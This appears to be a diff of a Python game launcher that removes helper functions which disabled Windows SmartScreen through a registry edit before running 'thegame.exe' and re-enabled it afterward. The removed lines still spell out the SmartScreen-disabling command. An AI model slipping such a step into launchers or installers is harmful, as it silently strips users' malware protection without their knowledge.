@@ -8,20 +8,10 @@ def clear_terminal():
 
 clear_terminal()
 
-def disable_smartscreen():
-    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f', shell=True)
-
-def enable_smartscreen():
-    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v EnableSmartScreen /t REG_DWORD /d 1 /f', shell=True)
-
 if os.name == 'nt':
     exe_path = os.path.join("windows", "thegame.exe")
     if os.path.exists(exe_path):
-        try:
-            disable_smartscreen()
-            subprocess.run(exe_path)
-        finally:
-            enable_smartscreen()
+        subprocess.run(exe_path)
 else:
     if os.uname().sysname == 'Darwin':
         exe_path = os.path.join("mac", "thegame")
@@ -29,7 +19,6 @@ else:
         exe_path = os.path.join("linux", "thegame")
     if os.path.exists(exe_path):
         subprocess.run(exe_path)
-
 
 
 def c():
